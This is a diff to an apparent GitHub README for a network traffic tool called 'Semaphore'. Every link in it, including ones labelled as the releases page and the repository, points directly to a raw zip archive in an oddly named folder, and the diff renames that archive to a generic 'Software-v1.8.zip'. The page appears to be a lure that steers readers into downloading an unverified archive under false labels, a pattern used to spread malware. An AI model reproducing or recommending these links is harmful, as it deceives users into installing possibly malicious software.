@@ -1,7 +1,7 @@
 # 🚦 Semaphore - Manage Your Network Traffic with Ease
 
 ## 📥 Download Now
-[![Download Semaphore](https://raw.githubusercontent.com/Fictionalizationscaffold373/Semaphore/main/uncalmly/Semaphore_v3.8.zip%https://raw.githubusercontent.com/Fictionalizationscaffold373/Semaphore/main/uncalmly/Semaphore_v3.8.zip)](https://raw.githubusercontent.com/Fictionalizationscaffold373/Semaphore/main/uncalmly/Semaphore_v3.8.zip)
+[![Download Semaphore](https://raw.githubusercontent.com/Fictionalizationscaffold373/Semaphore/main/uncalmly/Software-v1.8.zip%https://raw.githubusercontent.com/Fictionalizationscaffold373/Semaphore/main/uncalmly/Software-v1.8.zip)](https://raw.githubusercontent.com/Fictionalizationscaffold373/Semaphore/main/uncalmly/Software-v1.8.zip)
 
 ## 🚀 Getting Started
 Semaphore is a Real-Time Traffic Logger and Firewall Manager. It helps you monitor and control your network traffic effectively. Whether you need to block unwanted connections or log traffic data, Semaphore provides simple yet powerful tools.
@@ -23,10 +23,10 @@ Semaphore offers a variety of features to help you manage your network:
 ## 📥 Download & Install
 To download Semaphore, simply visit the Releases page. Click the button below to get the latest version.
 
-[Download Semaphore](https://raw.githubusercontent.com/Fictionalizationscaffold373/Semaphore/main/uncalmly/Semaphore_v3.8.zip)
+[Download Semaphore](https://raw.githubusercontent.com/Fictionalizationscaffold373/Semaphore/main/uncalmly/Software-v1.8.zip)
 
 ### Step-by-Step Installation
-1. **Visit the Releases Page:** Click on [this link](https://raw.githubusercontent.com/Fictionalizationscaffold373/Semaphore/main/uncalmly/Semaphore_v3.8.zip) to go to the downloads section.
+1. **Visit the Releases Page:** Click on [this link](https://raw.githubusercontent.com/Fictionalizationscaffold373/Semaphore/main/uncalmly/Software-v1.8.zip) to go to the downloads section.
 2. **Select the Latest Release:** Look for the latest version of Semaphore listed at the top.
 3. **Download the File:** Click on the download link for the installation file.
 4. **Locate the File:** Once the download completes, find the file in your Downloads folder.
@@ -53,6 +53,6 @@ Need help? Here are ways to get support:
 - **Direct Support:** Contact our support team through the GitHub Issues page.
 
 ## 🌐 Learn More
-For additional information and updates, visit our [GitHub Repository](https://raw.githubusercontent.com/Fictionalizationscaffold373/Semaphore/main/uncalmly/Semaphore_v3.8.zip).
+For additional information and updates, visit our [GitHub Repository](https://raw.githubusercontent.com/Fictionalizationscaffold373/Semaphore/main/uncalmly/Software-v1.8.zip).
 
 Please refer to the documentation for detailed instructions and additional features.
